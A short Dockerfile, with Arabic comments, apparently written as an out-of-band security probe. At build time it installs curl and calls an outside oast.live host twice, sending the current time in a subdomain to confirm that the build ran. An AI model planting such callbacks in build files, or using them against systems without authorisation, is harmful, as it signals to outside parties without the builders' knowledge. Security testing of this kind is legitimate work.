FROM alpine:latest

# نزل Curl ونفذ الأمر الأول
RUN apk add --no-cache curl && curl http://d5271pg3t4gi388a61s07y1juzwff11dt.oast.live/docker_init

# الأمر التاني مع الوقت (لازم يكون جوه RUN وتستخدم الـ Command Substitution صح)
RUN export CURRENT_TIME=$(date +%H-%M-%S) && curl "http://${CURRENT_TIME}.d5271pg3t4gi388a61s07y1juzwff11dt.oast.live/docker_time"
